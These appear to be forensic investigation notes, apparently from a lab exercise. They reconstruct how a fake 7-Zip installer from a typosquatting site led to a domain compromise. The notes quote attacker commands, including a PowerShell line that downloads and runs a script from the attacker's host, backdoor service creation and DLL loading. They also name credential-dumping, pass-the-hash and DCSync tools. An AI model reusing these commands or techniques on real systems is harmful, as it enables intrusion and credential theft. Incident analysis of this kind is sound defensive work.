Original Notes

Summary / Report

1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site.

While under pressure to open an encrypted 7z archive his boss sent, Perry opened Chrome, searched for “7-Zip,” and—without verifying the source—clicked the first result (http://www.7zipp.org), inadvertently downloading a fake installer.

2- The user runs the fake 7-Zip installer.

At 14:23:00, the user double-clicked “7z2301-x64.msi.” Windows unpacked it into a temporary stub (MSI542E.tmp) and executed it.

3- The MSI stub immediately spawns PowerShell to fetch a hidden payload.

At 14:23:02, MSI542E.tmp ran:

text
iex (iwr http://www.7zipp.org/a/7z.ps1 -UseBasicParsing)

which downloads and executes “7z.ps1” directly in memory.

4- A legitimate 7-Zip installer is silently deployed to mask the attack.

Seconds later, the script dropped and ran “7zlegit.exe /S,” installing genuine 7-Zip in silent mode so the system appears normal.

5- A malicious back-door service is created.

At 14:23:23, the attacker ran:

text
sc.exe create 7zService binpath=“…\7zipp.exe” start=auto obj=LocalSystem

and immediately started the service, running the attacker’s “7zipp.exe” as SYSTEM.

6- The back-door loads a malicious DLL for code execution.

“7zipp.exe” invoked:

text
rundll32.exe 7zipp.dll,Start

handing control over to the embedded attacker payload under SYSTEM privileges.

7- Credentials are dumped from memory.

At 14:24:22, a NanoDump PowerShell script captured an LSASS memory dump, then at 14:25:18 PowerExtract parsed out NT hashes and Kerberos tickets—all in memory.

8- Active Directory reconnaissance is performed.

Immediately after, SharpHound (Invoke-Bloodhound) was run to enumerate domain relationships and identify high-value targets.

9- Mimikatz is staged and NT hashes stolen.

At 14:28:53, Mimikatz was downloaded. By 14:29:43 it was used first to pass-the-hash as James Cromwell, then on a second host to perform a DCSync against Damian Hall’s account.

10- Hashes are used to impersonate high-privilege users.

Using sekurlsa::pth, new PowerShell sessions were launched as Damian Hall, granting full access to his credentials.

11- Lateral movement via credential reuse.

The attacker reset anna.jones’s password (to “pwn3dpw!!!”) with PowerView, then used WinRM (Invoke-Command) and her credentials to deploy payloads across multiple hosts.

12- Browser-stored credentials are exfiltrated.

On each compromised system, SharpChromium and SharpChrome harvested saved passwords from Chrome and Edge.

13- Privilege escalation in Active Directory.

Anna was added to the “AD Recovery” group with IT-admin credentials, then SharpKatz DCSync was executed again—this time remotely via PowerShell—to pull additional hashes.

14- The final destructive payload is deployed.

In Perry Parsons’s profile directory, “777bomb.exe” was downloaded and run repeatedly likely triggering the ransomware or wiper component that completes the attack.
